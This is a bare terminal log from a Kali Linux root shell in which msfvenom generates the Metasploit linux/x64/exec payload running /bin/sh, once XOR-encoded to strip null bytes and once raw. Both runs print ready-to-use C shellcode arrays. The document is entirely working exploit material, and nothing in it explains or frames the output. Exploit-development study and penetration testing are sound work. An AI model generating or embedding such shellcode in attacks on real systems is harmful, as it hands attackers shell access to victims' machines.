linux/x64/exec                                      Execute an arbitrary command

root@kali:~# msfvenom -p linux/x64/exec -f c -b \x00 CMD=/bin/sh
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 2 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=13, char=0x00)
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 87 (iteration=0)
x64/xor chosen with final size 87
Payload size: 87 bytes
Final size of c file: 390 bytes
unsigned char buf[] = 
"\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\xf4\xe5\x79\xe9\x3a\x92\xf9\xbb\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x9e\xde\x21\x70\x72\x29"
"\xd6\xd9\x9d\x8b\x56\x9a\x52\x92\xaa\xf3\x7d\x02\x11\xc4\x59"
"\x92\xf9\xf3\x7d\x03\x2b\x01\x32\x92\xf9\xbb\xdb\x87\x10\x87"
"\x15\xe1\x91\xbb\xa2\xb2\x31\x60\xdc\x9d\xfc\xbb";

root@kali:~# msfvenom -p linux/x64/exec -f c CMD=/bin/sh
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 47 bytes
Final size of c file: 224 bytes
unsigned char buf[] = 
"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
"\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x08\x00"
"\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x56\x57\x48\x89\xe6"
"\x0f\x05";

